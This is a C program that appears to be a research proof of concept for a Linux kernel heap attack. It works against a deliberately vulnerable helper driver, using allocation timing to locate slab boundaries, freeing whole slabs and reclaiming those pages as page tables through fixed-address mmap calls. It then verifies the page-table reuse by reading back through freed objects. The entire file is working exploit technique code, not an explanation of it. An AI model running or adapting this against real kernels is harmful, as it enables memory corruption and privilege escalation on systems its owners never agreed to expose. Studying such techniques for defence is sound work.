#define _POSIX_SOURCE
#include "uhelper.h"
#include "pgtable.h"
#include "cacheutils.h"

/**
 * Constants
 */
#define PMD_SIZE (1ULL << 21)
#define PUD_SIZE (1ULL << 30)
#define PGD_SIZE (1ULL << 39)
#define PAGE_SIZE (1ULL << 12)

size_t addresses[(1<<20)];
/**
 * Interacting functions with the kernel
 */
#define ALLOC(i) do { int ret = alloc_obj(i, cur->size, (size_t)&addresses[i]); if (ret) pr_error("alloc timing error\n"); } while (0)
#define FREE(i) do { int ret = free_obj(i); if (ret) pr_error("free timing error\n"); } while (0)
#define WRITE(i, buf) do { int ret = write_obj(i, cur->size, buf); if (ret) pr_error("write error\n"); } while (0)
#define READ(i, buf) do { int ret = read_obj(i, cur->size, buf); if (ret) pr_error("read error\n"); } while (0)
#ifdef ARM64
#define THRESHOLD -8000
#else
#define THRESHOLD -800
#endif

/**
 * Vulnerable kernel driver for the kernel heap vulnerability
 */
#include "slab_settings.h"

void mmap_warmup(void)
{
    char *data;
    pr_debug("alloc virtual memory\n");

    data = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (data == MAP_FAILED)
        pr_perror("mmap");
}

static size_t *start_indexes;

void alloc_objs(void)
{
    pr_debug("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i)
        ALLOC(i);
}

void timed_alloc_objs(void)
{
    size_t t0;
    size_t t1;
    ssize_t time = 0;
    ssize_t prev_time = 0;
    ssize_t derived_time = 0;
    ssize_t start = -1;
    size_t running = 0;

    pr_debug("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i) {
        sched_yield();
        t0 = rdtsc_begin();
        ALLOC(i);
        t1 = rdtsc_end();
        prev_time = time;
        time = t1 - t0;
        if (i > cur->allocs/4) {
            derived_time = time - prev_time;
            if (start == -1) {
                if (derived_time < THRESHOLD) {
                    start = i;
                    continue;
                }
            } else if (i - start == cur->obj_per_slab) {
                if (derived_time < THRESHOLD) {
                    start_indexes[running] = start-1;
                    running++;
                    if (running == cur->slab_per_chunk * 2)
                        break;
                    start = i;
                } else {
                    start = i;
                    running = 0;
                }
            }
        }
    }
    if (running != cur->slab_per_chunk * 2) {
        pr_warning("RETRY (start not found)\n");
        exit(0);
    }
    for (size_t i = 0; i < cur->slab_per_chunk * 2; ++i)
        pr_debug("start %ld\n", start_indexes[i]);
}

void zeroed_objs(void)
{
    static char buf[PAGE_SIZE];
    pr_debug("zero out %ld objs\n", cur->allocs);
    memset(buf, 0, PAGE_SIZE);
    for (size_t i = 0; i < cur->allocs; ++i)
        WRITE(i, (size_t)buf);
}

#ifdef ARM64
size_t is_pt(size_t *chunk, size_t size)
{
    size_t found = 0;
    for (size_t i = 0; i < size; ++i)
        found |= (chunk[i] & 0x0800000000000003) == 0x0800000000000003;
    return found;
}
#else
size_t is_pt(size_t *chunk, size_t size)
{
    size_t found = 0;
    for (size_t i = 0; i < size; ++i)
        found |= (chunk[i] & _PAGE_TABLE) == _PAGE_TABLE;
    return found;
}
#endif

void free_buffer_objs(void)
{
    // for (size_t i = 0; i < cur->allocs/8; ++i) {
    //     if ((i % cur->obj_per_slab) == 3)
    //         continue;
    //     FREE(i);
    // }
}

static void *data;
void free_objs_and_alloc_mmap(void)
{
    static char zeroed[PAGE_SIZE];
    static char buf[PAGE_SIZE];
    size_t pude = 0;

    /* alloc for pmd and pt mapping */
    data = mmap((void *)0xd0000000000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");
    /* alloc and map pud */
    memset(data, 0x42, PAGE_SIZE);
    data = mmap((void *)(0xd0000000000 + PGD_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");

    pr_debug("empty caches and free objs slab per chunk %ld obj per slab %ld\n", cur->slab_per_chunk, cur->obj_per_slab);
    FREE(start_indexes[0] - 1);
    for (size_t i = 0; i < cur->slab_per_chunk * 2; i += 2) {
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            FREE(start_indexes[i] + j);
        }
    }
    /* map pmd and pt */
    memset(data, 0x42, PAGE_SIZE);
    arb_pagetable_walk((size_t)data, 0, &pude, 0, 0);

    size_t success = 0;
    /**
     * pmd and pts
     */
    for (size_t i = 0; i < cur->slab_per_chunk * 2; i += 2) {
        size_t already_print = 0;
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            READ(start_indexes[i] + j, (size_t)buf);
            if (memcmp(zeroed, buf, cur->size)) {
                if (is_pt((size_t *)buf, cur->size/8) && !already_print) {
                    already_print = 1;
                    size_t found = *(size_t *)buf == pude;
                    if (found)
                        success |= i == cur->reclaimed_page_table;
                    pr_info("kaddr %016lx slab %ld (alloc nb %ld) %s\n", addresses[start_indexes[i] + j], i, start_indexes[i] + j, found ? "pud" : "used but not from pud");
                    // if (*(size_t *)buf != pgd)
                    //     hex_dump((size_t *)buf, cur->size/8);
                } else if (!already_print) {
                    already_print = 1;
                    pr_info("kaddr %016lx slab %ld (alloc nb %ld) used but not from pud\n", addresses[start_indexes[i] + j], i, start_indexes[i] + j);
                    // hex_dump((size_t *)buf, cur->size/8);
                    // wait_input();
                }
            }
        }
    }
    if (success)
        pr_success("SUCCESS\n");
    else
        pr_warning("FAIL\n");
}

/**
 * frees the attacker-allocated objects
 */
void cleanup(void)
{
    for (size_t i = 0; i < cur->allocs; ++i)
        FREE((1 << 17) + i);
    for (size_t i = 0; i < start_indexes[0]-1; ++i)
        FREE(i);
}

/**
 * main function
 */
int main(int argc, char *argv[])
{
    size_t generic_cache_size;
    if (argc < 2 || argc > 3)
        pr_error("usage: %s <generic_cache_size> <cpu_pinning?>\n", argv[0]);
    generic_cache_size = strtol(argv[1], 0, 10);
    if (generic_cache_size > 256)
        pr_error("only single-page slabs, i.e., object size smaller/equal than 256\n");

    PRINT_WARNING = 1;
    PRINT_INFO = 1;
    PRINT_DEBUG = 0;

    pr_info("start\n");
    if (argc == 3 && !strcmp(argv[2], "0"))
        helper_init_no_pinning();
    else
        helper_init();
    set_current_slab_info(generic_cache_size);
    start_indexes = malloc(sizeof(size_t)*cur->slab_per_chunk);

    pr_debug("allocate free pages as warmup\n");
    mmap_warmup();

    pr_debug("alloc\n");
    alloc_objs();
    timed_alloc_objs();
    zeroed_objs();

    free_buffer_objs();

    pr_debug("free slab page\n");
    free_objs_and_alloc_mmap();

    pr_debug("cleanup\n");
    cleanup();

    pr_info("done\n");
}
